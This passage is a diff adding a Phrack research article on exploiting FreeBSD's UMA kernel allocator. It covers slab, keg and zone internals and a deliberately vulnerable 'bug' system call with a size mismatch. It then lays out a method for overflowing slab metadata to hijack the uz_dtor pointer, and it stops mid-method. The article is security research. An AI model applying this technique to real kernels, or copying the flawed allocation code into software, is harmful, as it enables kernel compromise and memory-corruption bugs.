@@ -1,0 +1,1513 @@
+				==Phrack Inc.==
+
+		Volume 0x0d, Issue 0x42, Phile #0x08 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=--------=[ Exploiting UMA, FreeBSD's kernel memory allocator ]=--------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[    By argp <argp@hushmail.com>,      ]=--------------=|
+|=---------------=[       karl <karl@signedness.org      ]=--------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Table of contents
+
+1 - Introduction
+2 - UMA: FreeBSD's kernel memory allocator
+3 - A sample vulnerability
+4 - Exploitation methodology
+  4.1 - Kernel shellcode
+  4.2 - Keeping the system stable
+5 - Conclusion
+6 - References
+7 - Code
+
+--[ 1 - Introduction
+
+The latest development version (8.0-CURRENT at the time of this writing)
+of FreeBSD has introduced stack-smashing detection and protection for the
+kernel by utilizing the incorporation of SSP in GCC [1, 2].  This creates
+an increased interest in exploring the FreeBSD kernel heap implementation,
+or zone allocator to be more precise, from a security perspective since it
+currently provides no exploitation mitigation mechanisms.
+
+This paper presents my findings on exploiting FreeBSD's kernel memory
+allocator, or UMA - the universal memory allocator [3, 4], on the IA-32
+platform.  While a certain amount of knowledge of the FreeBSD kernel's
+internals and IA-32 assembly would be useful in following the paper, they
+are not strictly required.  All presented details and supporting code have
+been tested on FreeBSD 7.0, 7.1, 7.2 and 8.0-CURRENT from 20090511, but
+since 7.2 is the latest stable version all code excerpts have been taken
+from it.
+
+--[ 2 - UMA: FreeBSD's kernel memory allocator
+
+UMA or the universal memory allocator, also referred to as a zone
+allocator in the documentation, is FreeBSD's kernel memory allocator that
+functions like a traditional slab allocator [5].  The main idea behind
+slab allocators is that they provide an efficient memory management
+front-end, usually divided into multiple layers, to the low-level page
+allocations by retaining the state of constant-sized items between uses.
+It is called a slab allocator since it initially allocates large areas, or
+slabs, of memory and then pre-allocates on them items of a particular type
+and size per slab.  When the kernel requests through the malloc(9)
+interface items of a certain type, a pre-allocated item that was marked as
+free from the corresponding slab is returned.  UMA is also used for
+arbitrary-sized malloc(9) requests in which case the requested size is
+adjusted for alignment to find the suitable slab.  The advantages of this
+approach are no fragmentation of the kernel's memory and increased
+performance since the items are pre-allocated and grouped to slabs
+according to their size.
+
+The exploitation of slab overflow vulnerabilities has been investigated in
+the past by twiz and sgrakkyu in the context of the Linux and Solaris
+kernels [6].  Specifically, they have identified that slab overflows may
+lead to corruptions of a) adjacent items on a slab, b) page frames that
+are adjacent to the last item of a slab, or c) slab control structures.
+The example they give in [6] uses approach a) to exploit Linux kernel slab
+overflows.  On FreeBSD I use approach c).
+
+Since FreeBSD's UMA implementation uses the terms 'zone' and 'slab' to
+refer to conceptually different things, I will now stop using them
+interchangeably.  A full explanation of both is given below, just keep in
+mind for the time being that in the context of the FreeBSD kernel a zone
+and a slab are not the same thing.
+
+On FreeBSD we can use the vmstat(8) utility to get a report on the
+different types of zones that the kernel has created for its data
+structures, and their characteristics like name, size of the type of item
+allocated on them, number of items currently in use, and number of free
+items per zone, among others:
+
+[argp@julius ~]$ vmstat -z
+ITEM                SIZE     LIMIT      USED      FREE  REQUESTS  FAILURES
+
+UMA Kegs:           128,        0,       94,       26,       94,        0
+UMA Zones:          480,        0,       94,        2,       94,        0
+UMA Slabs:           64,        0,      353,        1,      712,        0
+UMA RCntSlabs:      104,        0,       69,        5,       69,        0
+UMA Hash:           128,        0,        6,       24,        7,        0
+16 Bucket:           76,        0,       31,       19,       50,        0
+32 Bucket:          140,        0,       20,        8,       41,        0
+64 Bucket:          268,        0,       27,        1,       76,       11
+128 Bucket:         524,        0,       18,        3,      975,       30
+VM OBJECT:          124,        0,      830,       69,    12161,        0
+MAP:                140,        0,        7,       21,        7,        0
+KMAP ENTRY:          68,    15512,       24,      200,     1750,        0
+MAP ENTRY:           68,        0,      555,      117,    24862,        0
+DP fakepg:           72,        0,        0,        0,        0,        0
+mt_zone:           1032,        0,      255,      129,      255,        0
+16:                  16,        0,     2250,      389,    15191,        0
+32:                  32,        0,     1163,       80,    10077,        0
+64:                  64,        0,     3244,       60,     5149,        0
+128:                128,        0,     1493,      187,     5820,        0
+256:                256,        0,      308,        7,     3591,        0
+512:                512,        0,       43,       13,      827,        0
+1024:              1024,        0,       47,       81,     1405,        0
+2048:              2048,        0,      314,        6,      491,        0
+4096:              4096,        0,      101,       12,     4900,        0
+Files:               76,        0,       51,       99,     3803,        0
+TURNSTILE:           76,        0,       78,       66,       78,        0
+umtx pi:             52,        0,        0,        0,        0,        0
+PROC:               696,        0,       62,       18,      839,        0
+THREAD:             556,        0,       76,        1,       76,        0
+UPCALL:              44,        0,        0,        0,        0,        0
+SLEEPQUEUE:          32,        0,       78,      148,       78,        0
+VMSPACE:            232,        0,       20,       31,      797,        0
+cpuset:              40,        0,        2,      182,        2,        0
+audit_record:       856,        0,        0,        0,        0,        0
+mbuf_packet:        256,        0,        0,      128,       26,        0
+mbuf:               256,        0,        1,      141,      778,        0
+mbuf_cluster:      2048,     8768,      128,        6,      141,        0
+
+...
+
+Mountpoints:        716,        0,        5,        5,        5,        0
+FFS inode:          128,        0,      429,       21,      451,        0
+FFS1 dinode:        128,        0,        0,        0,        0,        0
+FFS2 dinode:        256,        0,      429,       21,      451,        0
+SWAPMETA:           276,    30548,        0,        0,        0,        0
+
+FreeBSD's UMA implementation uses a number of different structures to
+manage kernel virtual memory.  All of these structures can be found in
+src/sys/vm/uma_int.h.  The fundamental one is the zone which is defined as
+a struct of type uma_zone [7]:
+
+struct uma_zone {
+    char        *uz_name;   /* Text name of the zone */
+    struct mtx  *uz_lock;   /* Lock for the zone (keg's lock) */
+    uma_keg_t   uz_keg;     /* Our underlying Keg */                [2-1]
+
+    LIST_ENTRY(uma_zone)    uz_link;        \
+                        /* List of all zones in keg */              [2-2]
+    LIST_HEAD(,uma_bucket)  uz_full_bucket; /* full buckets */      [2-3]
+    LIST_HEAD(,uma_bucket)  uz_free_bucket; /* Buckets for frees */ [2-4]
+
+    uma_ctor    uz_ctor;    /* Constructor for each allocation */
+    uma_dtor    uz_dtor;    /* Destructor */                        [2-5]
+    uma_init    uz_init;    /* Initializer for each item */
+    uma_fini    uz_fini;    /* Discards memory */
+
+    u_int64_t   uz_allocs;  /* Total number of allocations */
+    u_int64_t   uz_frees;   /* Total number of frees */
+    u_int64_t   uz_fails;   /* Total number of alloc failures */
+    uint16_t    uz_fills;   /* Outstanding bucket fills */
+    uint16_t    uz_count;   /* Highest value ub_ptr can have */
+
+    /*
+     * This HAS to be the last item because we adjust the zone size
+     * based on NCPU and then allocate the space for the zones.
+     */
+    struct uma_cache    uz_cpu[1];  /* Per cpu caches */
+};
+
+Each uma_zone structure is created to allocate a specific type of kernel
+memory and is itself allocated on a zone called 'UMA Zones'.  As we can
+see, uma_zone contains function pointers for allowing the kernel
+programmer to define custom constructors and destructors for each
+allocated item.  This is an important detail to keep in mind when we are
+looking for a way to divert the flow of execution after an overflow.
+uma_zone also holds statistical data for the zone, like the total numbers
+of allocations, frees and failures.  Most importantly, a zone structure
+also contains two lists of uma_bucket structures, or buckets, which cache
+items that have been allocated/deallocated from the zone's slabs.  These
+buckets are defined as follows [8]:
+
+struct uma_bucket {
+    LIST_ENTRY(uma_bucket)  ub_link;    /* Link into the zone */
+    int16_t ub_cnt;                     /* Count of free items. */
+    int16_t ub_entries;                 /* Max items. */
+    void    *ub_bucket[];               /* actual allocation storage */
+};
+
+In a uma_zone struct the uz_free_bucket list at [2-4] holds buckets to be
+used for deallocations of items, while the uz_full_bucket list at [2-3]
+for allocations.
+
+To enhance performance on multiprocessor systems each zone also has an
+array of per-CPU caches that are logically on top of the zone's buckets.
+These are defined structures of type uma_cache [9]:
+
+struct uma_cache {
+    uma_bucket_t    uc_freebucket;  /* Bucket we're freeing to */
+    uma_bucket_t    uc_allocbucket; /* Bucket to allocate from */
+    u_int64_t       uc_allocs;      /* Count of allocations */
+    u_int64_t       uc_frees;       /* Count of frees */
+};
+
+A keg is another UMA structure used for back-end allocation that describes
+the format of the underlying page(s) on which the items of the
+corresponding zone are stored.  Kegs are of type struct uma_keg [10]:
+
+struct uma_keg {
+    LIST_ENTRY(uma_keg) uk_link;    /* List of all kegs */
+
+    struct mtx  uk_lock;            /* Lock for the keg */
+    struct uma_hash uk_hash;
+
+    LIST_HEAD(,uma_zone)    uk_zones;       \
+                                /* Keg's zones */               [2-6]
+    LIST_HEAD(,uma_slab)    uk_part_slab;   \
+                                /* partially allocated slabs */ [2-7]
+    LIST_HEAD(,uma_slab)    uk_free_slab;   \
+                                /* empty slab list */           [2-8]
+    LIST_HEAD(,uma_slab)    uk_full_slab;   \
+                                /* full slabs */                [2-9]
+
+    u_int32_t   uk_recurse;     /* Allocation recursion count */
+    u_int32_t   uk_align;       /* Alignment mask */
+    u_int32_t   uk_pages;       /* Total page count */
+    u_int32_t   uk_free;        /* Count of items free in slabs */
+    u_int32_t   uk_size;        /* Requested size of each item */
+    u_int32_t   uk_rsize;       /* Real size of each item */
+    u_int32_t   uk_maxpages;    /* Maximum number of pages to alloc */
+
+    uma_init    uk_init;        /* Keg's init routine */
+    uma_fini    uk_fini;        /* Keg's fini routine */
+    uma_alloc   uk_allocf;      /* Allocation function */
+    uma_free    uk_freef;       /* Free routine */
+
+    struct vm_object    *uk_obj;    /* Zone specific object */
+    vm_offset_t uk_kva;         /* Base kva for zones with objs */
+    uma_zone_t  uk_slabzone;    \
+                        /* Slab zone backing us, if OFFPAGE */  [2-10]
+
+    u_int16_t   uk_pgoff;   /* Offset to uma_slab struct */     [2-11]
+    u_int16_t   uk_ppera;   /* pages per allocation from backend */
+    u_int16_t   uk_ipers;   /* Items per slab */
+    u_int32_t   uk_flags;   /* Internal flags */
+};
+
+While it is possible for a zone to be associated with more than one keg
+for receiving allocations from multiple source pages, it is not a very
+common occurrence (except in some network optimization cases for example)
+and therefore we will focus on the case of having an one-to-one
+association between kegs and zones.  When a zone is created by the kernel,
+the corresponding keg is created as well.  A zone's keg holds three lists
+of slabs:
+
+    * uk_full_slab is the list which holds full slabs; that is slabs on
+    which all items are marked as being used or allocated [2-9],
+    
+    * uk_free_slab holds slabs on which all items are marked as not being
+    used or free [2-8],
+    
+    * the uk_part_slab list holds slabs which contain both allocated and
+    free items [2-7].
+
+Each slab is of size UMA_SLAB_SIZE which is equal to PAGE_SIZE, which by
+default is set to 4096 bytes.  Slabs are described by uma_slab structures
+[11]:
+
+struct uma_slab {
+    struct uma_slab_head    us_head;    /* slab header data */  [2-12]
+    struct {
+            u_int8_t        us_item;
+    } us_freelist[1];                   /* actual number bigger */
+};
+
+The slab header structure, uma_slab_head at [2-12], contains the metadata
+that are necessary for the management of the slab/page [12]:
+
+struct uma_slab_head {
+    uma_keg_t   us_keg;                 /* Keg we live in */    [2-13]
+    union {
+            LIST_ENTRY(uma_slab)    _us_link;   /* slabs in zone */
+            unsigned long   _us_size;   /* Size of allocation */
+    } us_type;
+    SLIST_ENTRY(uma_slab)   us_hlink;   /* Link for hash table */
+    u_int8_t    *us_data;               /* First item */
+    u_int8_t    us_flags;               /* Page flags see uma.h */
+    u_int8_t    us_freecount;   /* How many are free? */
+    u_int8_t    us_firstfree;   /* First free item index */
+};
+
+So, to put it all together, each zone holds buckets of items that are
+allocated from the zone's slabs.  Each zone is also associated with a keg
+which holds the zone's slabs.  Each slab is of the same size as a page
+frame (usually 4096 bytes) and has a slab header structure which contains
+management metadata.  The following diagram ties together all the UMA data
+structures we have analyzed so far:
+
+ ...................
+ |  +-----------+  |
+ |  |CPU 0 cache|  |
+ |  +-----------+  |
+ |                 |
+ |.--------------. |
+ ||  uma_cache   | |   .--------.                  .-------.
+ ||     ...      |<----|uma_zone|----------------->|uma_keg|
+ ||uc_freebucket | |   `--------'                  `-------'
+ ||uc_allocbucket| |        |                          |
+ |`|-------------' |        |                          |
+ '`|''''''''''''''''        |                          |
+   |                        |                          |
+   |         +--------------+-------+                  |
+   |         |                      |                  |
+   |         |                      |                  |
+   |         v                      v                  |
+   |  uz_full_bucket         uz_free_bucket            |
+   |    .----------.           .----------.            |
+   |    |.----------.          |.----------.           |
+   |    `|.----------.         `|.----------.          |
+   |     `|.----------.         `|.----------.         |
+   +----->`|uma_bucket|         .`|uma_bucket|         |
+   |       `----------'       .   `----------'         |
+   |          .             .           ^              |
+   |          .           .             |              |
+   +----------.---------.---------------+              |
+              .       .                                |
+              .     .      +------------------+--------+-----------+
+              .   .        |                  |                    |
+              . .          v                  v                    v
+              .       uk_part_slab       uk_free_slab       uk_full_slab
+              .         .--------.         .--------.         .--------.
+              .         |.--------.        |.--------.        |.--------.
+              .         `|.--------.       `|.--------.       `|.--------.
+              .          `|.--------.       `|.--------.       `|.--------.
+              .           `|uma_slab|        `|uma_slab|        `|uma_slab|
+              .            `--------'.        `--------'         `--------'
+              .                        .          .            .
+              .                          .        .         .
+              .                        .----------------------.
+              .                        |      uma_slab        |
+              .                        |                      |
+ .------------------------.            |   .-------------.    |
+ |                        |            |   |uma_slab_head|    |
+ |      uma_bucket        |            |   `-------------'    |
+ |         ...            |            | .------------------. |
+ |  .------------------.  |            | |struct {          | |
+ |  |void *ub_bucket[];|---------------->|u_int8_t us_item  | |
+ |  `------------------'  |            | |} us_freelist[];  | |
+ `------------------------'            | `------------------' |
+                                       `----------------------'
+
+Depending on the size of the items a slab has been divided into for, the
+uma_slab structure may or may not be embedded in the slab itself.  For
+example, let's consider the anonymous zones ('4096', '2048', '1024', ...,
+'16') which serve malloc(9) requests of arbitrary sizes by adjusting for
+alignment purposes the requested size to the nearest zone.  The '512' zone
+is able to store eight items of 512 bytes in every slab associated with
+it.  The uma_slab structure in this case is stored offpage on a UMA zone
+that has been allocated for this purpose.  The uma_keg structure
+associated with the '512' zone actually contains a uma_zone pointer to
+this slab zone (uk_slabzone at [2-10]) and an unsigned 16-bit integer that
+specifies the offset to the corresponding uma_slab structure (uk_pgoff at
+[2-11]).
+
+On the other hand, the slabs of the '256' anonymous zone store fifteen
+items (of size 256 bytes each) and in this case the uma_slab stuctures are
+stored onto the slabs themselves after the memory reserved for items.
+These two slab representations are actually illustrated in a comment in
+the FreeBSD code repository [13].  We include the diagram here since it is
+crucial for the understanding of the slab structure ('i' represents a slab
+item):
+
+Non-offpage slab
+___________________________________________________________
+| _  _  _  _  _  _  _  _  _  _  _  _  _  _  _   ___________ |
+||i||i||i||i||i||i||i||i||i||i||i||i||i||i||i| |slab header||
+||_||_||_||_||_||_||_||_||_||_||_||_||_||_||_| |___________||
+|___________________________________________________________|
+
+Offpage slab
+___________________________________________________________
+| _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _  _   |
+||i||i||i||i||i||i||i||i||i||i||i||i||i||i||i||i||i||i||i|  |
+||_||_||_||_||_||_||_||_||_||_||_||_||_||_||_||_||_||_||_|  |
+|___________________________________________________________|
+ ___________    ^
+|slab header|   |
+|___________|---+
+
+--[ 3 - A sample vulnerability
+
+In order to explore the possibility of exploiting UMA related overflows we
+will add a new system call to FreeBSD via the dynamic kernel linker (KLD)
+facility [14].  The new system call will use malloc(9) and introduce an
+overflow on UMA managed memory.  This sample vulnerability is based on the
+signedness.org challenge #3 by karl [15] (we don't include the complete
+KLD module here, see file bug/bug.c in the code archive for the full
+code):
+
+#define SLOTS 100
+
+static char *slots[SLOTS];
+
+#define OP_ALLOC    1
+#define OP_FREE     2
+
+struct argz
+{
+    char *buf;
+    u_int len;
+    int op;
+    u_int slot;
+};
+
+static int
+bug(struct thread *td, void *arg)
+{
+    struct argz *uap = arg;
+
+    if(uap->slot >= SLOTS)
+    {
+        return 1;
+    }
+
+    switch(uap->op)
+    {
+        case OP_ALLOC:
+            if(slots[uap->slot] != NULL)
+            {
+                return 2;
+            }
+            
+[3-1]       slots[uap->slot] = malloc(uap->len & ~0xff, M_TEMP, M_WAITOK);
+            if(slots[uap->slot] == NULL)
+            {
+                return 3;
+            }
+
+            uprintf("[*] bug: %d: item at %p\n", uap->slot,
+                    slots[uap->slot]);
+            
+[3-2]       copyin(uap->buf, slots[uap->slot] , uap->len);
+            break;
+        
+        case OP_FREE:
+            if(slots[uap->slot] == NULL)
+            {
+                return 4;
+            }
+            
+[3-3]       free(slots[uap->slot], M_TEMP);
+            slots[uap->slot] = NULL;
+            break;
+
+        default:
+            return 5;
+    }
+
+    return 0;
+}
+
+The new system call is named 'bug'.  At [3-1] we can see that malloc(9)
+does not request the exact amount of memory specified by the system call
+arguments (and therefore the user), but then in [3-2] the user-specified
+length is used in copyin(9) to copy userland memory to the UMA managed
+kernel space memory.  In [3-3] we can see that the new system call also
+provides for us a away to deallocate a previously allocated slab item.
+After compiling and loading the new KLD module we need a userland program
+that uses the new system call 'bug'.  Using this we populate the slabs of
+the '256' anonymous zone with a number of items filled with '0x41's (file
+exhaust.c in the code archive):
+
+// Initially we load the KLD:
+[root@julius ~/code/bug]# kldload -v ./bug.ko
+bug loaded at 210
+Loaded ./bug.ko, id=4
+
+// As a normal user we can now use exhaust.c:
+[argp@julius ~/code/bug]$ kldstat | grep bug
+ 4    1 0xc263f000 2000     bug.ko
+[argp@julius ~/code/bug]$ vmstat -z | grep 256:
+256:                      256,        0,      310,       35,     9823,        0
+[argp@julius ~/code/bug]$ ./exhaust 20
+[*] bug: 0: item at 0xc25db300
+[*] bug: 1: item at 0xc25db700
+[*] bug: 2: item at 0xc25da100
+[*] bug: 3: item at 0xc2580700
+[*] bug: 4: item at 0xc2580500
+[*] bug: 5: item at 0xc25daa00
+[*] bug: 6: item at 0xc2580200
+[*] bug: 7: item at 0xc2434100
+[*] bug: 8: item at 0xc25db000
+[*] bug: 9: item at 0xc25dba00
+[*] bug: 10: item at 0xc2580900
+[*] bug: 11: item at 0xc25dab00
+[*] bug: 12: item at 0xc25db200
+[*] bug: 13: item at 0xc25db400
+[*] bug: 14: item at 0xc25db500
+[*] bug: 15: item at 0xc257fe00
+[*] bug: 16: item at 0xc2434000
+[*] bug: 17: item at 0xc25db100
+[*] bug: 18: item at 0xc2580e00
+[*] bug: 19: item at 0xc25dad00
+[argp@julius ~/code/bug]$ vmstat -z | grep 256:
+256:                      256,        0,      330,       15,     9873,        0
+
+As we can see from the output of vmstat(8), the number of items marked as
+free have been reduced from 35 to 15 (since we have consumed 20).
+
+UMA prefers slabs from the partially allocated list (uk_part_slab [2-7])
+in order to satisfy requests for items, thus reducing fragmentation.  To
+further explore the behavior of UMA, we will write another userland
+program that parses the output of 'vmstat -z' and extracts the number of
+free items on the '256' zone.  Then it will use the new 'bug' system call
+to consume/allocate this number of items.  UMA will subsequently create a
+number of new slabs and our userland program will continue and
+consume/allocate another fifteen items (fifteen is the maximum number of
+items that a slab of the '256' zone can hold; getzfree.c is available in
+the code archive):
+
+// Again, we load the KLD as root:
+[root@julius ~/code/bug]# kldload -v ./bug.ko
+bug loaded at 210
+Loaded ./bug.ko, id=4
+
+// As a normal user we can now use getzfree.c:
+[argp@julius ~/code/bug]$ ./getzfree 
+---[ free items on the 256 zone: 41
+---[ consuming 41 items from the 256 zone
+[*] bug: 0: item at 0xc25e4900
+[*] bug: 1: item at 0xc2592300
+[*] bug: 2: item at 0xc25e4300
+[*] bug: 3: item at 0xc25e4a00
+[*] bug: 4: item at 0xc25e3600
+[*] bug: 5: item at 0xc25e4400
+[*] bug: 6: item at 0xc25e4000
+[*] bug: 7: item at 0xc25e4b00
+[*] bug: 8: item at 0xc25e4c00
+[*] bug: 9: item at 0xc25e3500
+[*] bug: 10: item at 0xc25e4e00
+[*] bug: 11: item at 0xc25e4100
+[*] bug: 12: item at 0xc2593a00
+[*] bug: 13: item at 0xc25e3700
+[*] bug: 14: item at 0xc25e4200
+[*] bug: 15: item at 0xc2592200
+[*] bug: 16: item at 0xc2381800
+[*] bug: 17: item at 0xc2593d00
+[*] bug: 18: item at 0xc2592600
+[*] bug: 19: item at 0xc2592500
+[*] bug: 20: item at 0xc235d900
+[*] bug: 21: item at 0xc2434b00
+[*] bug: 22: item at 0xc2592800
+[*] bug: 23: item at 0xc2434800
+[*] bug: 24: item at 0xc2592000
+[*] bug: 25: item at 0xc2435e00
+[*] bug: 26: item at 0xc25e4d00
+[*] bug: 27: item at 0xc25e4600
+[*] bug: 28: item at 0xc25e3d00
+[*] bug: 29: item at 0xc25e3c00
+[*] bug: 30: item at 0xc25e4500
+[*] bug: 31: item at 0xc25e3900
+[*] bug: 32: item at 0xc25e4700
+[*] bug: 33: item at 0xc25e3b00
+[*] bug: 34: item at 0xc25e3000
+[*] bug: 35: item at 0xc25e3200
+[*] bug: 36: item at 0xc25e3800
+[*] bug: 37: item at 0xc25e3300
+[*] bug: 38: item at 0xc25e3100
+[*] bug: 39: item at 0xc25e4800
+[*] bug: 40: item at 0xc25e3a00
+---[ free items on the 256 zone: 45
+---[ allocating 15 items on the 256 zone...
+[*] bug: 41: item at 0xc25e6800
+[*] bug: 42: item at 0xc25e6700
+[*] bug: 43: item at 0xc25e6600
+[*] bug: 44: item at 0xc25e6500
+[*] bug: 45: item at 0xc25e6400
+[*] bug: 46: item at 0xc25e6300
+[*] bug: 47: item at 0xc25e6200
+[*] bug: 48: item at 0xc25e6100
+[*] bug: 49: item at 0xc25e6000
+[*] bug: 50: item at 0xc25e5e00
+[*] bug: 51: item at 0xc25e5d00
+[*] bug: 52: item at 0xc25e5c00
+[*] bug: 53: item at 0xc25e5b00
+[*] bug: 54: item at 0xc25e5a00
+[*] bug: 55: item at 0xc25e5900
+
+During the initial allocations the items are placed at seemingly
+unpredictable locations due to the fact that the items are actually
+allocated in free spots on partially full existing slabs.  After the
+current number of free items of the '256' zone is consumed, we can see
+that the next allocations follow a pattern from higher to lower addresses.
+Another useful observation we can make is that we always get a final item
+of a slab (i.e. at address 0x_____e00 for the '256' zone) somewhere in the
+next fifteen, or generally ITEMS_PER_SLAB, item allocations of newly
+created slabs.  Since we know that the slabs of the '256' anonymous zone
+have their uma_slab structures stored onto the slabs themselves, we can
+explore the kernel memory with ddb(4) [16] and try to identify the
+different UMA structures we have presented in the previous section.
+
+// We start by examining the memory at item #51 (0xc25e5d00).
+db> x/x 0xc25e5d00,100
+0xc25e5d00:     41414141        41414141        41414141        41414141
+0xc25e5d10:     41414141        41414141        41414141        41414141
+0xc25e5d20:     41414141        41414141        41414141        41414141
+0xc25e5d30:     41414141        41414141        41414141        41414141
+0xc25e5d40:     41414141        41414141        41414141        41414141
+0xc25e5d50:     41414141        41414141        41414141        41414141
+0xc25e5d60:     41414141        41414141        41414141        41414141
+0xc25e5d70:     41414141        41414141        41414141        41414141
+0xc25e5d80:     41414141        41414141        41414141        41414141
+0xc25e5d90:     41414141        41414141        41414141        41414141
+0xc25e5da0:     41414141        41414141        41414141        41414141
+0xc25e5db0:     41414141        41414141        41414141        41414141
+0xc25e5dc0:     41414141        41414141        41414141        41414141
+0xc25e5dd0:     41414141        41414141        41414141        41414141
+0xc25e5de0:     41414141        41414141        41414141        41414141
+0xc25e5df0:     41414141        41414141        41414141        41414141
+
+// Item #50 (0xc25e5e00) starts here, as we can see there are no metadata
+// between items on the slab.
+0xc25e5e00:     41414141        41414141        41414141        41414141
+0xc25e5e10:     41414141        41414141        41414141        41414141
+0xc25e5e20:     41414141        41414141        41414141        41414141
+0xc25e5e30:     41414141        41414141        41414141        41414141
+0xc25e5e40:     41414141        41414141        41414141        41414141
+0xc25e5e50:     41414141        41414141        41414141        41414141
+0xc25e5e60:     41414141        41414141        41414141        41414141
+0xc25e5e70:     41414141        41414141        41414141        41414141
+0xc25e5e80:     41414141        41414141        41414141        41414141
+0xc25e5e90:     41414141        41414141        41414141        41414141
+0xc25e5ea0:     41414141        41414141        41414141        41414141
+0xc25e5eb0:     41414141        41414141        41414141        41414141
+0xc25e5ec0:     41414141        41414141        41414141        41414141
+0xc25e5ed0:     41414141        41414141        41414141        41414141
+0xc25e5ee0:     41414141        41414141        41414141        41414141
+0xc25e5ef0:     41414141        41414141        41414141        41414141
+0xc25e5f00:     0               0               0               0
+0xc25e5f10:     0               0               0               0
+0xc25e5f20:     0               0               0               0
+0xc25e5f30:     0               0               0               0
+0xc25e5f40:     0               28203263        0               0
+0xc25e5f50:     0               0               0               0
+0xc25e5f60:     28203264        28203264        0               0
+0xc25e5f70:     0               0               0               0
+0xc25e5f80:     0               0               0               0
+0xc25e5f90:     0               0               2820b080        4
+
+// At 0xc25e5fa8 the uma_slab_head structure of the uma_zone structure
+// begins with the address of the keg (variable us_keg at [2-13]) that the
+// slab belongs to (0xc1474900).
+0xc25e5fa0:     0               0               c1474900        c25e4fa8
+0xc25e5fb0:     c25e6fac        0               c25e5000        f0002
+0xc25e5fc0:     4030201         8070605         c0b0a09         f0e0d
+0xc25e5fd0:     0               0               0               0
+0xc25e5fe0:     828             0               0               0
+0xc25e5ff0:     0               0               0               0
+
+// The first item of the 0xc25e6fa8 slab starts here.
+0xc25e6000:     41414141        41414141        41414141        41414141
+
+// Now let's examine the entire keg structure of our slab.  Walking through
+// the memory dump with the aid of the description of the uma_keg structure
+// [10] we can easily identify the address of the keg's zone (0xc146d1e0).
+// This is variable uk_zones at [2-6].
+db> x/x 0xc1474900,20
+0xc1474900:     c1474880        c1474980        c0b865cc        c0bd809a
+0xc1474910:     1430000         0               4               0
+0xc1474920:     0               0               0               c146d1e0
+0xc1474930:     c25e7fa8        0               c25e6fa8        0
+0xc1474940:     3               1a              d               100
+0xc1474950:     100             0               0               0
+0xc1474960:     c09e35f0        c09e35b0        0               0
+0xc1474970:     0               10fa8           f               10
+
+// The memory region of the zone that our slab belongs to (through the keg)
+// is shown below.  Using uma_zone's definition from [7] we can easily
+// identify that at address 0xc146d200 we have the uz_dtor function
+// pointer [2-5], among other interesting function pointers.  The default
+// value of the uz_dtor function pointer is NULL (0x0) for the '256'
+// anonymous zone.
+db> x/x 0xc146d1e0,20
+0xc146d1e0:     c0b865cc        c1474908        c1474900        0
+0xc146d1f0:     c147492c        0               0               0
+0xc146d200:     0               0               0               f52
+0xc146d210:     0               df9             0               0
+0xc146d220:     0               200000          c146b000        c146b1a4
+0xc146d230:     2d1             0               2c5             0
+0xc146d240:     0               0               0               0
+0xc146d250:     0               0               0               0
+
+To summarize this section before we present the actual exploitation
+methodology:
+
+    * We have observed that if we can consume a zone's free items
+    and force the allocation of new items on new slabs, we can get an
+    item at the edge of one of the new slabs within the first
+    ITEMS_PER_SLAB number of items,
+
+    * for certain zones their slabs' management metadata, i.e. their
+    uma_slab structure which contains the uma_slab_head structure, are
+    stored on the slabs themselves,
+
+    * with the goal of achieving arbitrary code execution in mind, we have
+    examined the uma_slab_head, uma_keg and uma_zone structures in memory
+    and identified several function pointers that could be overwritten.
+
+--[ 4 - Exploitation methodology
+
+As we have seen in the previous section, the uma_slab_head structure of a
+non-offpage slab is stored on the slab itself at a higher memory address
+than the items of the slab.  Taking advantage of an insufficient input
+validation vulnerability on kernel memory managed by a zone with
+non-offpage slabs (like for example the '256' zone), we can overflow the
+last item of the slab and overwrite the uma_slab_head structure [12].
+This opens up a number of different alternatives for diverting the flow of
+the kernel's execution.  In this paper we will only explore the one we
+have found to be easier to achieve that also allows us to leave the system
+in a stable state after exploitation.
+
+Returning to the sample vulnerability of our new 'bug' system call, we
+have discovered that the uz_dtor function pointer is NULL for the '256'
+anonymous zone.  However, if we manage to modify it to point to an
+arbitrary address we can divert the flow of execution to our code during
+the deallocation of the edge item from the underlying slab.  When free(9)
+is called on a memory address the corresponding slab is discovered from
+the address passed as an argument [17]:
+
+slab = vtoslab((vm_offset_t)addr & (~UMA_SLAB_MASK));
+
+The slab is then used to find the keg's address to which it belongs, and
+then the keg's address is used to find the zone (or, to be more precise,
+the first zone in case the keg is associated with multiple zones) which is
+subsequently passed to the uma_zfree_arg() function [18]:
+
+uma_zfree_arg(LIST_FIRST(&slab->us_keg->uk_zones), addr, slab);
+
+In uma_zfree_arg() the zone passed as the first argument is used to find
+the corresponding keg [19]:
+
+keg = zone->uz_keg;
+
+Finally, if the uz_dtor function pointer of the zone is not NULL then it
+is called on the item to be deallocated in order to implement the custom
+destructor that a kernel developer may have defined for the zone [20]:
+
+if (zone->uz_dtor)
+        zone->uz_dtor(item, keg->uk_size, udata);
+
+This leads to the formulation of our exploitation methodology (although
+our sample vulnerability is for the '256' zone, we try to make the steps
+generic to apply to all zones with non-offpage slabs):
+
+1. Using vmstat(8) we query the UMA about the different zones, we identify
+   the one we plan to target and parse the number of initial items marked
+   as free on its slabs.
+
+2. Using a system call, or some other code path that allows us to affect
+   kernel space memory from userland, we consume all the free items from
+   the target zone.
+
+3. Based on our heuristic observations, we then allocate ITEMS_PER_SLAB
+   number of items on the target zone.  Although we don't know exactly
+   which allocation will give us an item at the edge of a slab (it differs
+   among different kernels), it will be one among the ITEMS_PER_SLAB
+   number of allocations.  On all these allocations we trigger the
+   vulnerability condition, therefore the item allocated last on a slab
+   will overflow into the memory region of the slab's uma_slab_head
+   structure.
+
+4. We overwrite the memory address of us_keg [2-13] in uma_slab_head with
+   an arbitrary address of our choosing.  Since the IA-32 architecture 
+   does not implement a fully separated memory address space between
+   userland and kernel space, we can use a userland address for this
+   purpose; the kernel will dereference it correctly.  There are a number
+   of choices for that, but the most convenient one is usually the
+   userland buffer passed as an argument to the vulnerable system call.
+
+5. We construct a fake uma_keg structure at that memory address.  Our fake
+   uma_keg structure is consisting of sane values to all its elements,
+   however its uk_zones element [2-6] points to another area in our
+   userland buffer.  There we construct a fake uma_zone structure, again
+   with sane values for its elements, but we point the uz_dtor function
+   pointer [2-5] to another address at our userland buffer where we place
+   our kernel shellcode.
+
+6. The next step is to use the system call in order deallocate the last
+   ITEMS_PER_SLAB we have allocated in step 3.  This will lead to free(9),
+   then to uma_zfree_arg() and finally to the execution of the uz_dtor
